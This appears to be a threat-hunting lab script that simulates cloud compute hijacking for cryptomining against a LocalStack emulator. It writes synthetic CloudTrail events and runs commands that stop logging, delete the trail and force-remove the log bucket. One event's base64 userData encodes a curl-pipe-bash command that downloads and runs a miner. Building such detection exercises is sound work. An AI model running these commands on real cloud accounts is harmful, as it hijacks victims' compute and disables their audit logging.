#!/usr/bin/env bash
# run_crypto_mining.sh
# Interactive crypto mining / compute hijacking simulation for Hunt Lab.
# ATT&CK: T1496.001 (Compute Hijacking), T1070.004 (Indicator Removal),
#          T1562.001 (Impair Defenses)
#
# Run on cloud-sim: vagrant ssh cloud-sim -c "sudo bash /vagrant/scripts/scenarios/run_crypto_mining.sh"

set -euo pipefail

EXPORT_DIR="/var/log/localstack/cloudtrail"
ATTACKER_IP="45.155.205.233"  # Simulated Proton VPN exit
ACCT="000000000000"
REGION="us-east-1"

log()  { echo "[crypto-mining] $*"; }

uuid() { python3 -c "import uuid; print(str(uuid.uuid4()))"; }

write_ct_event() {
  local ename="$1" esrc="$2" uname="$3" ronly="$4"
  local rparams="${5:-null}"
  local eid; eid=$(uuid)
  local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  mkdir -p "${EXPORT_DIR}"
  python3 - <<EOF
import json
obj = {
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::${ACCT}:user/${uname}",
    "accountId": "${ACCT}", "userName": "${uname}"
  },
  "eventTime": "${ts}", "@timestamp": "${ts}",
  "eventSource": "${esrc}", "eventName": "${ename}",
  "awsRegion": "${REGION}", "sourceIPAddress": "${ATTACKER_IP}",
  "userAgent": "boto3/1.34.0 Python/3.11.0",
  "requestParameters": json.loads('${rparams}'), "responseElements": None,
  "requestID": "req-${eid}", "eventID": "${eid}",
  "readOnly": json.loads('${ronly}'), "eventType": "AwsApiCall",
  "managementEvent": True, "recipientAccountId": "${ACCT}"
}
with open("${EXPORT_DIR}/${eid}.json", "w") as f:
    json.dump(obj, f)
print("  [cloudtrail] ${ename} (user=${uname})")
EOF
}

cat <<BANNER
=============================================================
  Hunt Lab — Crypto Mining / Compute Hijacking Scenario
  ATT&CK: T1496.001, T1070.004, T1562.001
  Attacker IP: ${ATTACKER_IP}
=============================================================
BANNER

# Phase 1: Reconnaissance
log "Phase 1: Reconnaissance — enumerating compute capacity..."
write_ct_event "GetCallerIdentity"           "sts.amazonaws.com" "dev-ops" "true"
write_ct_event "DescribeRegions"             "ec2.amazonaws.com" "dev-ops" "true"
write_ct_event "DescribeAvailabilityZones"   "ec2.amazonaws.com" "dev-ops" "true"
awslocal ec2 describe-instances &>/dev/null || true
write_ct_event "DescribeInstances"           "ec2.amazonaws.com" "dev-ops" "true"
write_ct_event "GetAccountSummary"           "iam.amazonaws.com" "dev-ops" "true"
write_ct_event "DescribeInstanceTypeOfferings" "ec2.amazonaws.com" "dev-ops" "true"
sleep 2

# Phase 2: Infrastructure setup
log "Phase 2: Setting up mining infrastructure..."
write_ct_event "CreateKeyPair" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"keyName":"mining-ops-key"}'
write_ct_event "DescribeSecurityGroups" "ec2.amazonaws.com" "dev-ops" "true"
write_ct_event "CreateSecurityGroup" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"groupName":"mining-sg","groupDescription":"Internal automation","vpcId":"vpc-00000000"}'
write_ct_event "AuthorizeSecurityGroupEgress" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"groupId":"sg-0mining001","ipPermissions":[{"ipProtocol":"-1","fromPort":-1,"toPort":-1,"ipRanges":[{"cidrIp":"0.0.0.0/0"}]}]}'
sleep 2

# Phase 3: Launch mining fleet (T1496.001)
log "Phase 3: Launching compute fleet..."
# Simulate RunInstances for different instance types (LocalStack will succeed even without real AMIs)
write_ct_event "RunInstances" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"instanceType":"t3.xlarge","minCount":1,"maxCount":1,"keyName":"mining-ops-key","imageId":"ami-0123456789abcdef0","userData":"IyEvYmluL2Jhc2gKY3VybCAtc0wgaHR0cDovL3Bvb2wubWluZXhoci5jb20vbWluZXIgfCBiYXNoCg=="}'
sleep 1
write_ct_event "RunInstances" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"instanceType":"c5.4xlarge","minCount":5,"maxCount":5,"keyName":"mining-ops-key","imageId":"ami-0123456789abcdef0"}'
sleep 1
write_ct_event "RunInstances" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"instanceType":"m5.8xlarge","minCount":10,"maxCount":10,"keyName":"mining-ops-key","imageId":"ami-0123456789abcdef0"}'
write_ct_event "CreateTags" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"resourcesSet":{"items":[{"resourceId":"i-0001fake"}]},"tagSet":{"items":[{"key":"Name","value":"batch-worker"},{"key":"Project","value":"ml-training"}]}}'
write_ct_event "DescribeInstances" "ec2.amazonaws.com" "dev-ops" "true" \
  '{"filterSet":{"items":[{"name":"instance-state-name","valueSet":{"items":[{"value":"running"}]}}]}}'
write_ct_event "DescribeSpotPriceHistory" "ec2.amazonaws.com" "dev-ops" "true" \
  '{"instanceTypeSet":{"items":[{"instanceType":"c5.4xlarge"}]}}'
write_ct_event "RequestSpotInstances" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"spotPrice":"0.50","instanceCount":20,"launchSpecification":{"instanceType":"c5.4xlarge","imageId":"ami-0123456789abcdef0"}}'
sleep 2

# Phase 4: Cover tracks (T1070.004, T1562.001)
log "Phase 4: Disabling monitoring and covering tracks..."
awslocal cloudtrail stop-logging --name hunt-lab-trail &>/dev/null || true
write_ct_event "StopLogging" "cloudtrail.amazonaws.com" "dev-ops" "false" \
  '{"name":"hunt-lab-trail"}'
awslocal cloudtrail delete-trail --name hunt-lab-trail &>/dev/null || true
write_ct_event "DeleteTrail" "cloudtrail.amazonaws.com" "dev-ops" "false" \
  '{"name":"hunt-lab-trail"}'
write_ct_event "PutBucketVersioning" "s3.amazonaws.com" "dev-ops" "false" \
  '{"bucketName":"cloudtrail-logs","VersioningConfiguration":{"Status":"Suspended"}}'
awslocal s3 rb s3://cloudtrail-logs --force &>/dev/null || true
write_ct_event "DeleteBucket" "s3.amazonaws.com" "dev-ops" "false" \
  '{"bucketName":"cloudtrail-logs"}'
write_ct_event "ModifyInstanceAttribute" "ec2.amazonaws.com" "dev-ops" "false" \
  '{"instanceId":"i-0001fake","disableApiTermination":{"value":true}}'

# Re-create trail so lab keeps working
awslocal s3 mb s3://cloudtrail-logs &>/dev/null || true
awslocal cloudtrail create-trail --name hunt-lab-trail \
  --s3-bucket-name cloudtrail-logs &>/dev/null || true
awslocal cloudtrail start-logging --name hunt-lab-trail &>/dev/null || true

log "Scenario complete. Events written to ${EXPORT_DIR}"
echo ""
echo "  Hunt in Kibana: http://192.168.56.10:5601"
echo "  Index: cloudtrail-*  |  Filter: sourceIPAddress: ${ATTACKER_IP}"
echo "  Key events: RunInstances (x3 batches), StopLogging, DeleteTrail, DeleteBucket"
echo "  ATT&CK techniques: T1496.001, T1070.004, T1562.001"
